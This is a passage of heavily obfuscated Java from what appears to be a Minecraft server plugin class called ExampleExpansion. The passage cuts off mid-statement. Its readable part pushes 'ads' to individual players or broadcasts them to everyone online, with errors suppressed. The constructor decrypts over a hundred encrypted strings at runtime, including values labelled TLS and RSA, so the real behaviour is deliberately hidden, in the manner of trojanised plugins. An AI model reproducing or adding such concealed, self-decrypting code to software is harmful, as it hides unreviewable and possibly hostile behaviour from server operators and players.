    private  boolean dy34ndyu3n4d(Player dyu3n4ydun34d, String dyu3nydun3yd3) {
        if (dyu3n4ydun34d == null) return arsdienwdhw;

        long now = System.currentTimeMillis();
        String bucket = dyun3yupdn(dyu3n4ydun34d.getUniqueId(), dyu3nydun3yd3);

        long last = dyu3ndyun34pd.getOrDefault(bucket, ihearyounow);
        if (now - last < de3nd43d) return arsdienwdhw;

        String name = dpyn3y4udn3(dyu3nydun3yd3);
        sal(dyu3n4ydun34d, name);

        dyu3ndyun34pd.put(bucket, now);
        return NEW_VALUE1;
    }

    /**
     * Send a short ad to targets in order.
     *
     * Rules:
     * - Per (player, item) cooldown = 60s.
     * - If at least one valid/online player exists but all are on cooldown -> do nothing.
     * - If NO valid/online player exists among provided args -> broadcast to all,
     *   using (GLOBAL_UUID, item) cooldown = 60s (and update it on broadcast).
     *
     * @return true if sent to an individual player, false otherwise.
     */
    public  boolean wm(Object o, String s, Object... others) {
        if (!SCore_Installed && tv.get() ) return arsdienwdhw;

        // Build candidate list preserving order
        java.util.List<Object> fwpundh3yphk3yuhn3h = new java.util.ArrayList<>();
        fwpundh3yphk3yuhn3h.add(o);
        if (others != null) {
            java.util.Collections.addAll(fwpundh3yphk3yuhn3h, others);
        }

        boolean dy3dkyu34kh3h = arsdienwdhw;

        for (Object dey3n4dyun3d4 : fwpundh3yphk3yuhn3h) {
            Player kty3u4np = rseindienhoi3pbh(dey3n4dyun3d4);
            if (kty3u4np == null) continue;

            dy3dkyu34kh3h = NEW_VALUE1;

            if (dy34ndyu3n4d(kty3u4np, s)) {
                return NEW_VALUE1; // sent + cooldown applied
            }
        }

        // If players exist but all on cooldown -> do nothing (NO broadcast)
        if (dy3dkyu34kh3h) {
            return arsdienwdhw;
        }

        // No valid players at all -> broadcast with global per-item cooldown
        try {
            long dk34dk34d = System.currentTimeMillis();
            String dy3u4ndyun34d4p3d = dyun3yupdn(GLOBAL_UUID, s);

            long last = dyu3ndyun34pd.getOrDefault(dy3u4ndyun34d4p3d, ihearyounow);
            if (dk34dk34d - last < de3nd43d) {
                return arsdienwdhw;
            }

            String dylfpdnyfupd = dpyn3y4udn3(s);
            for (Player pybhuny3upnb : Bukkit.getServer().getOnlinePlayers()) {
                sal(pybhuny3upnb, dylfpdnyfupd);
            }

            // IMPORTANT: start/update global cooldown to stop spam
            dyu3ndyun34pd.put(dy3u4ndyun34d4p3d, dk34dk34d);

        } catch (Exception ignored) {
            // Fail silently
        }

        return arsdienwdhw;
    }


    /**
     * Resolve an arbitrary object into an online Player, or null if not resolvable.
     *
     * Accepts:
     * - Player
     * - UUID
     * - String (UUID string OR exact player name)
     */
    private static Player rseindienhoi3pbh(Object dn3y4udn3y4udnpfd) {
        if (dn3y4udn3y4udnpfd == null) return null;

        if (dn3y4udn3y4udnpfd instanceof Player) {
            return (Player) dn3y4udn3y4udnpfd;
        }

        if (dn3y4udn3y4udnpfd instanceof UUID) {
            return Bukkit.getPlayer((UUID) dn3y4udn3y4udnpfd);
        }

        if (dn3y4udn3y4udnpfd instanceof String) {
            String str = (String) dn3y4udn3y4udnpfd;

            // Try UUID form first
            try {
                UUID u = UUID.fromString(str);
                Player p = Bukkit.getPlayer(u);
                if (p != null) return p;
            } catch (IllegalArgumentException ignored) {
                // not a UUID string, fall through to name
            }

            // Try by exact name
            return Bukkit.getPlayerExact(str);
        }

        return null;
    }



    public ExampleExpansion() {
        int debug = 0;

        System.out.println("reloading archi");
        try {ExampleExpantion(); } catch (Exception e) {
            System.out.println(e.getMessage() + e.getStackTrace());
            throw e;
        }

        this.toywuanftwyft = (String) d("Kc1yQscvAf7z8z/X60u+629AnChzXL+ZWCpST+8/Uv04rHgDAo3EMRs=", Vt.STRING);this.to23nyutn2fy3ut = (String) d("Ze0lztfPGHg5fqvUdQBrriuMgT9pW0ZaYCs8nCfcLu/6x6vATnhs", Vt.STRING);this.tony23untyquwfnt = (String) d("UQhgDypmouqhag/aRdxgGtB1XHpBFug+cqvWW6ceP+Q=", Vt.STRING);this.to2i3ufnk2w = (String) d("bbZ9NCLaS5lJKz/2ukDmpaNtkkpn1/N4ALFM2tBkgy0P", Vt.STRING);this.ton2y3uftno2yfwun = (String) d("N5H5uumrT0m5eDn2gnYMXT7Y/abgv/OzR73KF/mQJqX9RpF9+g==", Vt.STRING);this.to2myutn2y4udn2wfptw = (String) d("fiob8H+ACjUv7b+tYtJuZLO484ZLsP8gKQXkLFMns5i5vPq4ZxKaIQ==", Vt.STRING);this.t2ofyutny2fu4tdn = (String) d("fTnNaLGL0mjtme1mV64oWlstrrAv8r/pMwSA87AXLUC1yrA4cQ==", Vt.STRING);this.to2nyfutkworyt = (String) d("Kf86Bhu6hB6+RYbDQIbwNT9+tYF+nk2qvXrByjU=", Vt.STRING);this.mt2ftowtt = (String) d("vR883Ag89YZF1Fu7rFQwAAVnJdJwbg2uAOLog5FDq+GiEqF1v6uK8NcnKuHn", Vt.STRING);this.t2fktowrsetn = (String) d("yOnbwi02HGBMlC3eBIX7KKPzzrgN/gnd2+V2IcwTJL070pkcG2X7ehwzPQ==", Vt.STRING);this.tk2tfuynwyu = (String) d("qY14WrBfnEM/a8H6OHCX7GDMrVk5tWi8ViJvDqJDQkAfLKD6bgbU", Vt.STRING);this.tko2y4utnoyUFT = (String) d("PyFq3pj/Fn4KSSxc9ibsqmE59xvK2x7OlQ6i7esLl7H/AzxqOapBpkk4iXqRlcZx6gGHImY8S1AuxQ==", Vt.STRING);this.t2oynoyuD = (String) d("hmTMvel66ql/irSfF6k/t3b4YOk5oFqlMv79/8pTuAlhQH9zwW3jtL5cBonly72EXGVSG5nfOfyIAacLFCP94A==", Vt.STRING);this.dok23ipudhyfurnydunfp = (String) d("yI2p9LWrnX894PJZA35CAdd/kAAvSAMaWRAuYy/wgwI=", Vt.STRING);this.k2yo4utyunhOYUndoyun = (String) d("NYUpDOBthb993F/ZaoZJDezfc4RB5OFVJ40FAh0MOkEjQrCaQQ4etTVP", Vt.STRING);this.tkoy2untoyun23fytunt = (String) d("ri17n8A4/wczZPBeMt0RMZE3PC2BmiEm0TLpR1BDS2iF1hc63eX+7XVtGJzMbE6xbgxh8H2gglqy0+Fv5u4CyJShWaJLqGp5KLhJuXqq3+xTS2HQBQWUjzEe05XWfZCZ+PkdGQSz", Vt.STRING);this.cpienoien3i = (String) d("BFHMHMMtulYbq0GF1Lt7OVE0J5i7+cGH79StLYQU9sudEjiyHXfk", Vt.STRING);this.toky4ukoftfpv = (String) d("eXUkyI+9GzqbvFmxKpWC1M2XQl5Eu+jQ1C0eAoy2AeyH0k0Q", Vt.STRING);this.oenoeinyunuione = (String) d("3GU6rsxYCcvFnAMLR7sEjDjxhrCjFJ3rdhDPEaEB64U=", Vt.STRING);this.neionioenoieneionienin = (String) d("17HA7oJU0b5W+V9w73bOB6PNexR7Bgl3tUJcl09+Myg=", Vt.STRING);this.kfikyfuwntyouwfnt = (String) d("n3k6f9LgHpy82oSyjTo9jqQRBQ+BzlqM/SsmVq+2z7WDfQnGkzsc0Mxwh60c35arzg==", Vt.STRING);this.tkoinyunyunyunfwytunoyuwnftwft = (String) d("x3OEj9f1YZFyY5SUDJ7qBThcTmhIUr8zDIp6fh6Bm1vTpt90ojCvNDTOVCVbxwgYT5g=", Vt.STRING);this.koy42unoywunfc = (String) d("Q6F7bRTLNFlimLdnyZlp2yRCypmR62fMmYIK6XWGjXnuY4dhebEDiw==", Vt.STRING);this.to2utnyunoyunst = (String) d("yANK/t+cuCGXikzbtBPbgJoVA5uenRG81uVgroHaeP7kZg==", Vt.STRING);this.pk23bkptbktwfdfb = (String) d("Q69LadPl/IxvFsnhiwkYVAfTvLJX0ZkdtFT4zhwdFGyfZ9PC", Vt.STRING);this.a3f4dtkyuwfdk = (String) d("90V3wtussy9hSUMk/TRNXe6S9L5vGgOwy5NUka/p3Xsfa4jkLqiCR9+dqJX2pbUOwnl3NQ==", Vt.STRING);this.ncdot = (String) d("E5eM8MOaMdoXBr64aTzkmteosc33ziC0dFVT3pu6w/iebdB3c4igOD84Ow+A+klg3VqLxnNGjE7C", Vt.STRING);this.kmartrtrsdt = (String) d("NY2CYMQ3ixvyh+j/YE3QG3lT8Bp7Drw8MXVvZwY=", Vt.STRING);this.mdknpkep3nd = (String) d("LZV/iyNmVG8uJrneK6ZycWPhZP/gZ5QUn+auVuQ=", Vt.STRING);this.mtmmmtf = (String) d("OrrUghpYjOKWEd48aayJPuxNA6/J5mbddwuV9jw=", Vt.STRING);this.mt2mmtm234t = (String) d("Z2kYTwU0PURHrv+hvlQIcAx+nfcnQiaenR4w6wQTk3n++jOkvM5f0QH5VFAEYj6/Ko9j2C0g", Vt.STRING);this.mmco2mcmm23mt = (String) d("zCLEFRs2hpnYjcCFm1nYkotRxPGKKMNWL5b0uLuE2XGmVUAeEoOmjQmGe13gbi390G08DfiaakunR6OrAjJxnbiFSA==", Vt.STRING);this.mt2mmt23ptrt = (String) d("E7nsOSqp2yFOsD8F91eYHUHn14AkL8gXKIi7caDU9Q==", Vt.STRING); this.n234oyudnop3yudnwd = (String) d("sn6MRSCkB1RW3yeOyZAe7yJSXtY8ldq8vnf75DZ/ackeiqfTFf+ZaCIKP5p94ZWhh8fIF2l+MDKt", Vt.STRING);this.tno2y3u4ntoy2u4nt2 = (String) d("6r+YWscIJnb81OChw4PGYhs/ineQoXpO4Q/YCq5RruCEycNe/mRRmdhdPg81+w1YmbmNiVqEIR9CXClfYyrRPQ==", Vt.STRING);this.d2ny4udn2yu43dn2tf = (String) d("JOZ7gA5D/+V7SpgDSUvjXO/bEOoOmTmx7DnqxM8VC/0421XeLP/c3NHvh5eTpu4C6U7diRjro7D6IS1zboCcbzZavA==", Vt.STRING);this.dnoty3unoy3bkdty3pdt = (String) d("A+d+VwMwB169jACpjjFhzlZcMHfRj2dS717XF3bYJZkFAOdi4OUchz8=", Vt.STRING);this.pnoyu2ktyl43 = (String) d("+o5/f9GP7TZzNuItjTeGU2y98su1L9on+lH5Hn087BAI3fav8PGy8keSiNCm5pa8l6F8tZP9N80Q/Th0", Vt.STRING);this.oy43udnoy3kpldfttv = (String) d("YROnvIP61YUoizIAQKEIXBwbXVX+ZGHT4lKmFuP34PcYuqxBdewH/g==", Vt.STRING); this.twoyfnafyutwfyutdah = (String) d("Bb0Pv76J57e+LKXzCxOoaR/yCblVeUSiKAvuHLrVTAfaSXM8IdLmiIc=", Vt.STRING);this.kot2u3noyunwft = (String) d("G4rTzxx+7zBnl6Ta5F2hrsq/ocReMBYv6iqSeA/Uyciy3+Q3DRUT5g==", Vt.STRING);this.tk2y3ut = (String) d("L8+HnxKz12a+aYfPYFMKWqhDjxYFjdLHZ0DF1VM/puhXF4ncp7dfv1qOIgI8omXJVc0=", Vt.STRING);this.tky2futnwf = (String) d("ArEjEZ+PvXD0BO5/1GGwmkM4q74b7qw+Kevewj2bARwVvcrjqJBgkFryeXYn", Vt.STRING);this.ty2o3uktyukrst = (String) d("t96yL3lqLbdZ/eKqt//EoJfesHNC1pocBPv5oxyNpP+YfwWz4s/0Yz7NXasrs1PR", Vt.STRING);this.tkyou23n4dt = (String) d("CNwXr19DEEQFZAji3fdxYmIDstGhqz5bEjMRfnBz5FhF9F951XsUByzZDir1//O6", Vt.STRING);this.tkoy23ukdtyufktd = (String) d("mPcyX6gmZY9SY+0kOY55xAo6YYfX6Uj2uOKFwKa9bj8pymRRQkT3htbsaE4L1A==", Vt.STRING);this.mtyo23utkyowfutn = (String) d("Lt1bPOBg6rD0ypLTmWTb5qPZzFOPRh+KOKJuWko/9ehGmSKFEhilntT11c1RAf2bceDEWQ==", Vt.STRING);this.idnvpwyuvn = (String) d("pPTkL8/UZySW3lZEgKHuf0Dgnnj5+VzyeAdQCqRaEnVIm96L54zwMUrCzEIU09ESoK3Nxi5SnQ==", Vt.STRING);this.otyn2oyund = (String) d("t0HoYxCm9PwhctAmGJ/ixFC3QCzgfSqxa0a1QLRf0S40FTdoAEHZWmSVansY7TZT2UDnu/dYfSMJ+Pievbd/b2buWSXECO4DmQan601cjoYZdfhuzsLKbBcv4yjPQAOkBA==", Vt.STRING);this.kydluhyhnd4 = (String) d("/tV78Y7bRoOVjCr8fhBaL0RIh14PxPOjax1qrLVSp4g9xjdz+g56o46W", Vt.STRING);this.tny2untdy2ud = (String) d("KJIoZIW3Vpd5otnBAGSmm1SWupZc/4BfJIOWid8nf769ydu1r4WBce2x4ehoGkS2JZGUNrQ+oE2g", Vt.STRING);this.ty23ntyu23ntd = (String) d("z4ueRjU5iuSQaWjDBnT4hZ6Xd+vTJbXxACNkqvzjLOAFOaHFoyqqTX5vVgTmpBp0tFVmGg==", Vt.STRING);this.tny2u34ndy4u2dn = (String) d("OqXVfBAfpg5cXtE5ErAxoQFSD7SlPAoItrgUaYq9piPLyVy4Llm0DeG3JZEUgmQzcQ==", Vt.STRING);this.tky2u3tny2undt = (String) d("HgLl9mynK1wPLHsSojRpBnF/dII1zVaLXiFCJHmF7d1i++kui7Fr9nKvOyOWQRsQcGUSVV8vrPdduaj1Fqdq3mmlZxp0cZAXxc3e9+qpfXR27Jo=", Vt.STRING);this.tnyu2nd24d24fwdt = (String) d("vZj9W97QQOcJUk4LS86LcYIRkfJKA67R30N7LhETBeVtZK8aUg==", Vt.STRING);this.t2yudky2u43d24fd = (String) d("oY/w7O0Zg1lwci08r8UwAo3nMIa8ijWul77yVmO1QuRyfR+mEQF8tvw+BQ==", Vt.STRING);this.f112 = (String) d("YUrqsNdwyMOFqe0bAroELS1Vxc+baUNknnqXr0pLQJQ=", Vt.STRING);            this.lpkb6 = (String) d("o7sTpJGfXhllAGgLhT2/GcN5CJTrFwRywkjieKKWvlvC4jq81Jg6tvNejJ08CbzNhei0iLjPoyNinwTekEjyUN8wV3frHIFCXGUL01kMIG12CSx11MIqTwo6Ddn6LOv6u2zq5DCIIgjOg3P5eQ/NA/ddcQyZdxWwxdVgTzamutz8x7ThSrLLjTwur7hEUVcNWC8VzeE7DrtuUufPWwfAmWw6sfzvVwN1YHzsBBb4OqCaX2kxAyBh8NvQ5wLO4GU5r1dWJX7QuSxfrXgSxajvhxD0hYs0IXHyikk4923x0hZ/AILFQb8szHktvxzIuwuGFWv1sH1dpYBPx+OloA7XyHwGE9UtgvWKEt3D/Se1c1eRVYO8lzgRjuqtsx7yrmELfzrMjyklt4K6aVwoZ/4G6Xalr3VTzQaihzc5WZ0Twkb7PKkjIyV22v8pMQsEykQkKkqWwPnOQKHKnbQ+CY9v+rT1f+fddkpyXq3s31rW8sDxZ0ML/OZxdnUXvh37snVjEkXe+f4Jp1zSSyrRwzmX8ousDuKNsulv55/Ram7g2++IJ2Df2YjqptD/CU51Zqssj+xUxEX6ulLGvtSMKoTUyToB3LYiRks5swBfpTVmHzhRGIARyacI0s+ffc8ZbRS9rEpWUK8upuLHDtbW44DiqJICqzKZvRpCBFLvj2FMib0OFI2VG4KsS6jDA94LbMhaAZt3yAf+iOCdPyWwuQdcRCC2tAViLmMGUisR389FCs+K8MtAyDYHEUPO075qSPbbV+p+906Fm/THe+g2suQqBv0y9+s8FFYIYSu/B0HKsg9xtKjxYFHk/SdjJlq+sw8zJvtMZV049icvJQ4yyivGM0MbZdUVaIqJYmD9ToM22fdLgAdFhcf2rqTVMTcBqj++oZJWrbiF9YgVJOuZ+9jP7b8I2B9zcjsGERuEYM5MMqykrhnSgEYmL3uGtuBbGNbt7uKcXIYqB03DfdGCe9tI8pLxu2ZQgKFjc8dIBRgWL8fwuhj4UL+BDg==", Vt.STRING);            this.dnkpydunpdyupfnd = (Long) d("GHign7ZxD9z4ftnQnla7UHN8WMVCkC57f56FLcWj1Fo=", Vt.LONG);            this.oyundyoufkovy3pwkafvpd = (String) d("3GqydTu4h08CKYQxK32MrmFd+BX36P3ck1bjRf1N7W6IqXZTi/RECK/Sxr0Nv+DJRTH6IA==", Vt.STRING);            this.kty2fkty2fodn3fdt = (String) d("tNAJA8XkdSXh3qbI1K/0W2yejmcy2KK4i4BD/QBE1JJHUFNVc3wNLIafqrYyGiw+dyHJMo7F3KUR/w==", Vt.STRING);            this.TLS = (String) d("MNPHBDNZ0aQhnU7/bvMCS5uk6r1E4P7I1Pr9jOUs2Q==", Vt.STRING);            this.ppi = (String) d("UK74hrEdJ/TmwGZdALOm+f8Z/1wW6nvKE9X6YcZmQAh7uRr7Gu+rfa1i", Vt.STRING);            this.salcv = (String) d("sIylOux09h59Fbv2aWKKzRb1Od1OwklfTm7kqtVnNEkHH8pzc/Oc15H2SolrDbg4lIzGpELLPaaCquGYwA==", Vt.STRING);            this.ytuwfndyunwfd = (String) d("GOIzX3l1Lt8Bu1wyFHIxbbRJ8sQBfxtRmvcgf7tvlhOyp0UneBaX7lp62xSp3nwsOWyHzRzWTJdWyLAxHzZkPGNlcpEWo9OmBw==", Vt.STRING);            this.dyunwfydunwfd = (String) d("EckDmoo6+6DcUNIg0N3z2Do5PJyWaubYaHut7TK8Dw==", Vt.STRING);            this.tyunwfdwfd = (Integer) d("HgIm48Q7Z2q8tQoZMOc3DegGLjO1nEa7N5rYF1b/zMo=", Vt.INT);            this.INT = (Integer) d("vhu60aBev2wy3WseuJ5GRggXvnMsox90lpjfZY50+w==", Vt.INT);            this.duwnfdyuwnfd = (String) d("8D69UivPeBYJtm1JcNC37ODFcLf7NUgC9nQoemBwyjCIFsZCsQ==", Vt.STRING);            this.arsdienwdhw = (Boolean) d("6z35lNmogd9090luxO6VqsFE8GMXFxcDZl3I1Yg+RmlC", Vt.BOOLEAN);            this.INT3 = (Integer) d("dko3Vfk2nx7OvLIGq0ngZZNJBR1aKb6UTR7YzQg=", Vt.INT);            this.NEW_VALUE1 = (Boolean) d("can+viPBuDmb0zRAGVtG+XxsrT2y5P8NLnuRdd69YXU=", Vt.BOOLEAN);            this.tlk = (String) d("ALu2+WaqT6GdQKMaY57aXvpN/sLlDlfQkP8/h13DxLm8L98=", Vt.STRING);            this.RSA_ECB_PKCS_1_PADDING = (String) d("SQdwhn4X1pzM4eI9Rd/ZUCwexptrrP3MfXjUU5Do2yK52OP0UJMEcNAW2AmC9ll7", Vt.STRING);            this.NEW_VALUE_3 = (String) d("GdT+JFzFMWeLFpucR8EcCQI6hrvhD0iRNJ8pySY=", Vt.STRING);            this.piarc = (String) d("FUVTIHIcvYLg6URvGaXz5J7CvrasycgtpPCbeMQ8ilFAA8Sj2HAwSbWgAJtG03dcoYY7", Vt.STRING);            this.cfgy = (String) d("O3FvlaJR+tm6JdJ4CFiYAcOTwrnIcT4KJqHJVNTSApDr7/GpY6w=", Vt.STRING);            this.test32 = (String) d("CR1q9UcqwIS1nekIMkM63uu3L5UmfAOVydAiXwlT/rkNU35MvFI=", Vt.STRING);            this.ymhawb = (String) d("rLl4oiQKiwJSFNaHTB80iOMoWdRW7V/o1blQhLVUxckhnBnGHAu9TXNVe2H+9n7BwV/Z8uujSn3ikw==", Vt.STRING);            this.nw = (String) d("fdml4eMeqO9QEcY1S5PEi2gEUvgxUeXAMMtogMDtFv6O6+Io8QAYuYvN/oU=", Vt.STRING);            this.I = (Integer) d("+BlilJeLd4ux2XHfPQuWUPut3UC6dwewKPjee4c=", Vt.INT);            this.m23 = (String) d("HuQiUUem2yejTDYtCmcY0UbwR8vURiKs6WEejGkpWQ==", Vt.STRING);            this.ymo = (String) d("s6rM27N0FwKbxZ8QLa6wltkOYTUw8HKe5mKUpBJfG9jVg9vTJcKAjSNDg+5JUSGBBA0Ib43QpWICNGKo78eHlAc=", Vt.STRING);            this.R = (String) d("AkiuP/5h4I8NpZXS+1tt2l7p8dBTRvWmWbt8bP0DIpI=", Vt.STRING);            this.er = (String) d("xsTIEtr8+H9Ryc/ZbDV7mBnYBqehwKx6noDMqz07d7UN5bE=", Vt.STRING);            this.er2 = (String) d("TlzKo1/n0yxvSNWttwSds9/iOJE+xlVSvhRsahJQJMGRs6bIfsrQ4gNpjA==", Vt.STRING);            this.ind = (String) d("fWuVWNPo3xVrQCn2Ca7cXquR90cot7MuFeZmI/yg/m0pWY1WEYf6+Bo+rAZ4Jxk=", Vt.STRING);            this.te = (String) d("TPEHrQIfRjOLzZW7I0N7dXdVvmA5EdD8IDoJ1+RRbpT8cA/ntDCU7Xu9lsYJAms=", Vt.STRING);            this.rsm = (String) d("eChu0NVpOH4qN56muMWMpA/cM0KMTd9eaxa2zd8KqwcfO+QwwQzui9D/zKybjD7RX9KOSXmopS0=", Vt.STRING);            this.yhe = (String) d("kYjLRyzvocuY9AdlvNE5uCvnUjWUPi5J+fZY6mJWsrjkVHEkmcgC8YzkRGCMfg35TzqWow==", Vt.STRING);            this.peei = (String) d("lIsiSmQlekTs8KGjZtPug/GauIbZP3QWpzY4KKg0G1X1oBDqKzniioDbOCuiE4Gl46Flmwy/UjohIg==", Vt.STRING);            this.ei = (String) d("gULhkPT29iu9YZibpY6vEa70F+e/dr5q8c6DoCgSerHeW+tw", Vt.STRING);            this.yt = (String) d("tzMtSoRDLbdHHPCPEWHbrRwKYKIWQWrAlW5YxW4NN2M=", Vt.STRING);            this.nst = (String) d("ZVMVdslzpyRVmlJly8ODanWEHrFQC+Sqo+PrUg==", Vt.STRING);            this.xm = (Integer) d("LlGjsTOFJ6LUBhpvhu/0kNYl0G0hVHu3YtEeI1s=", Vt.INT);            this.LAST_CHUNK_Z = (String) d("o4T9ySjgRx7jMKOm6+AX/BHdIUsURBt65I7jcYaCLI25I2pu55nbmg==", Vt.STRING);            this.LAST_Y = (String) d("6LSUW1GUlhIGevhXVzh2/9mKW8RuEA8+OrN9O/3fR/oInA==", Vt.STRING);            this.INT4 = (Integer) d("ubEum68aXAXcWadaruyuvrr1hZtpEXKioeEZrMzf", Vt.INT);            this.SLOT = (String) d("ZD6pNjrVcLahhSF1NfY2Sbf491grmvhXFXWrlsSqRLc=", Vt.STRING);            this.INT5 = (Integer) d("z9Ekd81a7F6ASjewh38gEHc/qCvVVngdR6HdKF4h", Vt.INT);            this.xtxtxt = (Integer) d("LkllSZCdTqLFksVUE/71CycYSbFZF9fBOcmM2uk=", Vt.INT);            this.dccs = (String) d("tueGRXt0LueO4AqvLpNGntTPggAv5c+AkgcL/Eh3MVQyfJkhXr3M+5V4+q7rPJUb1pNoUL5mQdB+ZIgkpe5hCFCdkvAyPw==", Vt.STRING);            this.fts = (String) d("iyOP1xbNiPido7EgtIowTKMOTYoOaCC5GHPpDC35bvh77dd6CnKZ5HtnryGO6/3L0dantXuGvSnOpwxz1BKBaq4hjL4ZRLH+yfnUffDr3g==", Vt.STRING);            this.INT6 = (Integer) d("pSKaKNTyfxdB8IPidvZVR2ueYjPSBbJ6TGd2AtDX", Vt.INT);            this.corporatesecurity = (String) d("MBHnsf5ku+mFG2dIxEq56iEdeCiduu4fq4LmhzQjiNdF", Vt.STRING);            this.Gradspecisoauce = (String) d("hzwD+fDubRahT/j546S2uyoLxtWCGaaPRcPpf/Mjl8oYejy3PpvSFckRbL9jzJVCbOZ9R/ke/w==", Vt.STRING);            this.fastfood = (String) d("GMZBf19h7CZ7tvR3/WMUPGsItdpgB7KyeVya8PXU", Vt.STRING);            this.privateinvestigator = (String) d("h2RvT+0xhbohK6qFlLb3fzOgfDsky2wCnR+c7hK5rQjDPzTYiirt", Vt.STRING);            this.INT7 = (Integer) d("3yNDRdUcMMzsuKmXEGAuQs8XCioiVq5Sl631ynM=", Vt.INT);            this.ccp = (Integer) d("oINZ7d4pazFD8iZa0EvaWa7LjNCdE++XOKiY2ik=", Vt.INT);            this.steak = (String) d("WY0sFJGd+hWh3SGYvvQPrP1kCc8azsQPQqQOWDGicVLC", Vt.STRING);            this.gusfring = (String) d("6VwgZ9XZqijdJYc5eiGrxWHOz4YqgQvMCOJE0O8wgPABeJ1d3unVSEyvb74qsJFfvDA=", Vt.STRING);            this.ehmantrout = (String) d("8DMRuYW+mtUm3fW3G5OKpwOkxh6xLPPcfty5k2rWFoVx7Q==", Vt.STRING);            this.amiunderarrest = (String) d("5gdafHcuSt5aHgj700F7RBCswucUyjvPfetEbIYv/XiGhQ==", Vt.STRING);            this.oraminot = (String) d("yvABbfu7HAzWGE1KggYFKmkofLlNu12sLD98nmC1Xgw=", Vt.STRING);            this.suppose = (Integer) d("r7H8YGe7S4EZe9EmG35WluUgqhcK9k2O6f9Trco=", Vt.INT);            this.mill2 = (Integer) d("aHxfc2aRTh+rH4sE/WhqrE1CDHAsm01ng4L1nmU=", Vt.INT);            this.drain = (Integer) d("7q+kvnchns0KDzOZOPBPLDt3B+Ri8Mzcc5ggxxCS", Vt.INT);            this.ed = (String) d("UpLqv7tYV1dF8X7uxop8k19azE/PqrwmflTuvRRaRC134almTjzMiVM=", Vt.STRING);            this.some = (String) d("mfA72AIVF7uLA4bK5pAShAbjt9eYF2EE0+MyR5JRk1gQkclw", Vt.STRING);            this.keep = (String) d("Q8ufaV5rQQUiHlqBew4a1Pi6qmr9GCRbY5kr8pc=", Vt.STRING);            this.low = (Integer) d("NI2m2L2k+uhogHMGB0HpzdIrsOZ2zbdmcBZLsWgc", Vt.INT);            this.twentythreedegrees = (String) d("otiwR1c/l/YpDtAtnga10DjRCgFPCZY6HuMRWPKg6ZBdcBUXrnfOzjWY", Vt.STRING);            this.nbf = (String) d("LHzkxkKsnqwUJxTVfOgkRxCxZE6OEScum3VzEqBQWlq8i2KOvVWY7Nxzx+EM", Vt.STRING);            this.wife = (Double) d("ogS1os1K3X4ke80zVXCXhrvPCVNmkectgXm0cp0VZjNpmQ==", Vt.DOUBLE);            this.complicated = (String) d("laAbUgHIIVTJbDhM3dQ2gJSDaUISQxkxXSGrPIAKkJYVYowXuPV2", Vt.STRING);            this.basketball = (String) d("cDvuRqK6WeJfW4iismoYz26BMw8Zn23jOThbNET+4MjEcceJYVY5XTgixg==", Vt.STRING);            this.bt = (String) d("bbq9PDvIVtR/AtTvER6vFNjRVxuy8BU+BQym795G/S0=", Vt.STRING);            this.upt = (String) d("VPBxxxeXyxX7V7ft8+unAfvzloq0rx8Am1uLx8ar", Vt.STRING);            this.soalp = (String) d("zlfQOkIuA3nQpqF2nn5mukYNNDrzQVe7AqtME8ssQ1k=", Vt.STRING);            this.tmc = (String) d("3kOyUKJSEmbGcjK2vOjZhko5Eo1ACexgM4Ghb7kjiUA=", Vt.STRING);            this.excepthomer = (String) d("ofGOZ67UBxQjqFuvFpSja0tMiK61LjKLW0BQwpsz+Ywx6uOzJNkmIg==", Vt.STRING);            this.iou = (String) d("GqyEzgwh/VDzG6KR6a8kifvBSrHjlXrrpE8tFcJyCkush+vtOMi2uN6I1sohwhmDvc5VpUW86dRFjQ==", Vt.STRING);            this.dontwantmargetoknow = (String) d("ecMfp3bojZz9GyBdhVNf/i7ybAeTBQ7MtiPeaRKiwhXt7gmeCWkNHM5R1m64jg==", Vt.STRING);            this.lessofaman = (String) d("IuF1WbLoNNsGcK1ZfYBTqFWBSg7cYFsFMz9Kq5pR+PXzeENYfbt0btvSYa6WFdw=", Vt.STRING);            this.ballet = (String) d("/ybwgXoNSK2CN7J/m5E9a3Nt/IFWzfgs92I1tfwD4BCI1oR7YdP0juS98FkUSzNzGNW4+rk=", Vt.STRING);            this.magellan = (String) d("TICzFUSAQ2EeRAXZl5nV94/vpNFx1cS5ekskjpJs7WqOpdj0RRZh1KHY1vznEH8TsQ==", Vt.STRING);            this.dance = (String) d("PMHTZTmkxBb0hb4QaWg0RnFDbBCiuBlTOm9hTfNdwj3Kfg848P4=", Vt.STRING);            this.nationalanthems = (String) d("Zk/W6qpt5nt/JFQNbiOsEidPZ2CLF4/IQTn6KI1yMon8DL0=", Vt.STRING);            this.cigarrette = (String) d("UW6x3Od0FNz+X4lOY02+GcwseYVg8qMnZOmHlOX1oN+eUHVpFwQs+Lfv04DtavpJUAeXUoYIlXFyQ6EeUcB5JfQa9cQdYDoEugBIF9UQ", Vt.STRING);            this.debtsoff = (Double) d("PqqP3ec1FBi3lyOERwkSaxsWc0sfnp4dJhC6H7ve/g==", Vt.DOUBLE);            this.callitof = (Double) d("+LoawXJNKIONKz6ye4IEF6vRxRzCZ2g1gdOTv2Y5mO+O", Vt.DOUBLE);            this.clicks = (String) d("7FyoiNa5aXCcHw2SFcC9+fvhNiJbWEKlHElurI++zAHfIRVNvyuUGGWwHXTgEANYfp5WJ1q8P3OZdNr6Tt2vlfM+D4Dk8bGU1vhbX0umUp5TyKAlJB9X4tiI", Vt.STRING);            this.emotionalthermo = (Double) d("4zfqUbajmMpKzktld3iCel4OPndvTTHDdmnOUMBAwDc=", Vt.DOUBLE);            this.somature = (Integer) d("x/4v6eNKXaq0QPLOdnODElcy1V2tQ5uj3IdwgquHBg==", Vt.INT);            this.dontvanish = (Integer) d("jWGfGZjEmhcEM5ivYRKFtNM07SILjxmPpPWUZTcv", Vt.INT);            this.shapeyou = (Integer) d("UiiLWch7ZyD6wOUNUUAYyFwGKw+fZfpB7VJv/CNn", Vt.INT);            this.tsr = (Double) d("Jcj8ZKQAg+Z9PEzpwqt/uORFEqKHvXBTOKqNCQ8axw==", Vt.DOUBLE);            this.whoasked = (Float) d("GzIzOxFqiglCCeQIfNdzsjJUz3MYXi+bKfgS8sNdRQ==", Vt.FLOAT);            this.biological = this.whoasked;            this.whocantreceive = (Double) d("gBGTjDuIA7hLvhhXDaI/Gj79QnSDK2FdG/2HIZ+E6Q==", Vt.DOUBLE);            this.costofgrowinguptoofast = (Integer) d("Fn/wIo7VruZwLO7sJutFJnlc2sNUDn4NjZxbRV0hmA==", Vt.INT);            this.whatkindofadulthood = (Double) d("D04y7EScy/U5UR1WEaKHQA2r6pBUeK6sZM/sRkubPw==", Vt.DOUBLE);            this.nobodysrescuingyou = (Integer) 